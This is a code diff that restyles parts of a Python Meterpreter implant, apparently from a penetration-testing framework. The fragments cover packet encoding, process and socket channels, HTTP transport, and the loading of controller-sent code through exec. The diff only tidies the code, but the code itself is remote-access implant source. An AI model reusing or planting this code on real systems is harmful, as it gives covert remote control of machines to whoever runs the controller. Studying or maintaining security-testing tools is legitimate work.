@@ -147,8 +147,7 @@ TLV_TYPE_PEER_PORT             = TLV_META_TYPE_UINT    | 1501
 TLV_TYPE_LOCAL_HOST            = TLV_META_TYPE_STRING  | 1502
 TLV_TYPE_LOCAL_PORT            = TLV_META_TYPE_UINT    | 1503
 
-EXPORTED_SYMBOLS = {}
-EXPORTED_SYMBOLS['DEBUGGING'] = DEBUGGING
+EXPORTED_SYMBOLS = {'DEBUGGING': DEBUGGING}
 
 def export(symbol):
 	EXPORTED_SYMBOLS[symbol.__name__] = symbol
@@ -156,7 +155,7 @@ def export(symbol):
 
 def generate_request_id():
 	chars = 'abcdefghijklmnopqrstuvwxyz'
-	return ''.join(random.choice(chars) for x in range(32))
+	return ''.join(random.choice(chars) for _ in range(32))
 
 @export
 def crc16(data):
@@ -195,12 +194,11 @@ def error_result(exception=None):
 def error_result_windows(error_number=None):
 	if not has_windll:
 		return ERROR_FAILURE
-	if error_number == None:
+	if error_number is None:
 		error_number = ctypes.windll.kernel32.GetLastError()
 	if error_number > 0xffff:
 		return ERROR_FAILURE
-	result = ((error_number << 16) | ERROR_FAILURE_WINDOWS)
-	return result
+	return ((error_number << 16) | ERROR_FAILURE_WINDOWS)
 
 @export
 def inet_pton(family, address):
@@ -223,7 +221,7 @@ def packet_enum_tlvs(pkt, tlv_type = None):
 	offset = 0
 	while (offset < len(pkt)):
 		tlv = struct.unpack('>II', pkt[offset:offset+8])
-		if (tlv_type == None) or ((tlv[1] & ~TLV_META_TYPE_COMPRESSED) == tlv_type):
+		if tlv_type is None or (tlv[1] & ~TLV_META_TYPE_COMPRESSED) == tlv_type:
 			val = pkt[offset+8:(offset+8+(tlv[0] - 8))]
 			if (tlv[1] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING:
 				val = str(val.split(NULL_BYTE, 1)[0])
@@ -233,8 +231,6 @@ def packet_enum_tlvs(pkt, tlv_type = None):
 				val = struct.unpack('>Q', val)[0]
 			elif (tlv[1] & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL:
 				val = bool(struct.unpack('b', val)[0])
-			elif (tlv[1] & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW:
-				pass
 			yield {'type':tlv[1], 'length':tlv[0], 'value':val}
 		offset += tlv[0]
 	raise StopIteration()
@@ -249,10 +245,7 @@ def packet_get_tlv(pkt, tlv_type):
 
 @export
 def tlv_pack(*args):
-	if len(args) == 2:
-		tlv = {'type':args[0], 'value':args[1]}
-	else:
-		tlv = args[0]
+	tlv = {'type':args[0], 'value':args[1]} if len(args) == 2 else args[0]
 	data = ""
 	if (tlv['type'] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT:
 		data = struct.pack('>III', 12, tlv['type'], tlv['value'])
@@ -266,11 +259,11 @@ def tlv_pack(*args):
 			value = bytes(value, 'UTF-8')
 		if (tlv['type'] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING:
 			data = struct.pack('>II', 8 + len(value) + 1, tlv['type']) + value + NULL_BYTE
-		elif (tlv['type'] & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW:
-			data = struct.pack('>II', 8 + len(value), tlv['type']) + value
-		elif (tlv['type'] & TLV_META_TYPE_GROUP) == TLV_META_TYPE_GROUP:
-			data = struct.pack('>II', 8 + len(value), tlv['type']) + value
-		elif (tlv['type'] & TLV_META_TYPE_COMPLEX) == TLV_META_TYPE_COMPLEX:
+		elif (
+			(tlv['type'] & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW
+			or (tlv['type'] & TLV_META_TYPE_GROUP) == TLV_META_TYPE_GROUP
+			or (tlv['type'] & TLV_META_TYPE_COMPLEX) == TLV_META_TYPE_COMPLEX
+		):
 			data = struct.pack('>II', 8 + len(value), tlv['type']) + value
 	return data
 
@@ -322,10 +315,7 @@ class STDProcessBuffer(threading.Thread):
 	def peek(self, l = None):
 		data = bytes()
 		self.data_lock.acquire()
-		if l == None:
-			data = self.data
-		else:
-			data = self.data[0:l]
+		data = self.data if l is None else self.data[:l]
 		self.data_lock.release()
 		return data
 
@@ -343,9 +333,9 @@ class STDProcess(subprocess.Popen):
 		self.echo_protection = False
 
 	def start(self):
-		self.stdout_reader = STDProcessBuffer(self.stdout, lambda: self.poll() == None)
+		self.stdout_reader = STDProcessBuffer(self.stdout, lambda: self.poll() is None)
 		self.stdout_reader.start()
-		self.stderr_reader = STDProcessBuffer(self.stderr, lambda: self.poll() == None)
+		self.stderr_reader = STDProcessBuffer(self.stderr, lambda: self.poll() is None)
 		self.stderr_reader.start()
 
 	def write(self, channel_data):
@@ -380,8 +370,8 @@ class PythonMeterpreter(object):
 		for func in list(filter(lambda x: x.startswith('_core'), dir(self))):
 			self.extension_functions[func[1:]] = getattr(self, func)
 		if self.driver:
-			if hasattr(self, 'driver_init_' + self.driver):
-				getattr(self, 'driver_init_' + self.driver)()
+			if hasattr(self, f'driver_init_{self.driver}'):
+				getattr(self, f'driver_init_{self.driver}')()
 			self.running = True
 
 	def debug_print(self, msg):
@@ -429,14 +419,14 @@ class PythonMeterpreter(object):
 		return idx
 
 	def get_packet(self):
-		packet = getattr(self, 'get_packet_' + self.driver)()
+		packet = getattr(self, f'get_packet_{self.driver}')()
 		self.communications_last = time.time()
 		if packet:
 			self.communications_active = True
 		return packet
 
 	def send_packet(self, packet):
-		getattr(self, 'send_packet_' + self.driver)(packet)
+		getattr(self, f'send_packet_{self.driver}')(packet)
 		self.communications_last = time.time()
 		self.communications_active = True
 
@@ -451,10 +441,7 @@ class PythonMeterpreter(object):
 				self.running = False
 		else:
 			self._http_last_seen = time.time()
-		if packet:
-			packet = packet[8:]
-		else:
-			packet = None
+		packet = packet[8:] if packet else None
 		return packet
 
 	def send_packet_http(self, packet):
@@ -502,7 +489,7 @@ class PythonMeterpreter(object):
 					channel = self.channels[channel_id]
 					data = bytes()
 					if isinstance(channel, STDProcess):
-						if not channel_id in self.interact_channels:
+						if channel_id not in self.interact_channels:
 							continue
 						if channel.stderr_reader.is_read_ready():
 							data = channel.stderr_reader.read()
@@ -516,7 +503,7 @@ class PythonMeterpreter(object):
 								d = channel.recv(1)
 							except socket.error:
 								d = bytes()
-							if len(d) == 0:
+							if not d:
 								self.handle_dead_resource_channel(channel_id)
 								break
 							data += d
@@ -563,12 +550,10 @@ class PythonMeterpreter(object):
 
 		self.last_registered_extension = None
 		symbols_for_extensions = {'meterpreter':self}
-		symbols_for_extensions.update(EXPORTED_SYMBOLS)
+		symbols_for_extensions |= EXPORTED_SYMBOLS
 		i = code.InteractiveInterpreter(symbols_for_extensions)
 		i.runcode(compile(data_tlv['value'], '', 'exec'))
-		extension_name = self.last_registered_extension
-
-		if extension_name:
+		if extension_name := self.last_registered_extension:
 			check_extension = lambda x: x.startswith(extension_name)
 			lib_methods = list(filter(check_extension, list(self.extension_functions.keys())))
 			for method in lib_methods:
@@ -595,9 +580,7 @@ class PythonMeterpreter(object):
 		channel = self.channels[channel_id]
 		if isinstance(channel, subprocess.Popen):
 			channel.kill()
-		elif isinstance(channel, MeterpreterFile):
-			channel.close()
-		elif isinstance(channel, MeterpreterSocket):
+		elif isinstance(channel, (MeterpreterFile, MeterpreterSocket)):
 			channel.close()
 		else:
 			return ERROR_FAILURE, response
@@ -622,8 +605,7 @@ class PythonMeterpreter(object):
 		if channel_id not in self.channels:
 			return ERROR_FAILURE, response
 		channel = self.channels[channel_id]
-		toggle = packet_get_tlv(request, TLV_TYPE_BOOL)['value']
-		if toggle:
+		if toggle := packet_get_tlv(request, TLV_TYPE_BOOL)['value']:
 			if channel_id in self.interact_channels:
 				self.interact_channels.remove(channel_id)
 			else:
@@ -692,15 +674,15 @@ class PythonMeterpreter(object):
 		if handler_name in self.extension_functions:
 			handler = self.extension_functions[handler_name]
 			try:
-				self.debug_print('[*] running method ' + handler_name)
+				self.debug_print(f'[*] running method {handler_name}')
 				result, resp = handler(request, resp)
 			except Exception:
-				self.debug_print('[-] method ' + handler_name + ' resulted in an error')
+				self.debug_print(f'[-] method {handler_name} resulted in an error')
 				if DEBUGGING:
 					traceback.print_exc(file=sys.stderr)
 				result = error_result()
 		else:
-			self.debug_print('[-] method ' + handler_name + ' was requested but does not exist')
+			self.debug_print(f'[-] method {handler_name} was requested but does not exist')
 			result = error_result(NotImplementedError)
 		resp += tlv_pack(TLV_TYPE_RESULT, result)
 		resp = struct.pack('>I', len(resp) + 4) + resp
